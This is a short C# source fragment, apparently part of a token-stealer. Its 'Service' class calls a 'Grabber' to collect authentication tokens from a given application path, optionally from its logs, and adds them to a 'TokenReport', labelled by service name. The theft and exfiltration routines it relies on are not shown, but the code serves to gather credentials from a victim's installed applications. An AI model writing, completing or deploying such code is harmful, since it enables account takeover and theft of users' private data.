internal class Service
{
    private readonly string _serviceName;
    private readonly string _servicePath;
    private readonly bool _searchLogs;

    public Service(string name, string path, bool logs = false)
    {
        _serviceName = name;
        _servicePath = path;
        _searchLogs = logs;
    }

    public void GetTokens()
    {
        var tokens = Grabber.GetTokens(_servicePath, _searchLogs);
        if (tokens is {Count: <= 0}) return;
        tokens.Insert(0, $"\n**{_serviceName}**");
        Head.TokenReport.AddRange(tokens);
    }
}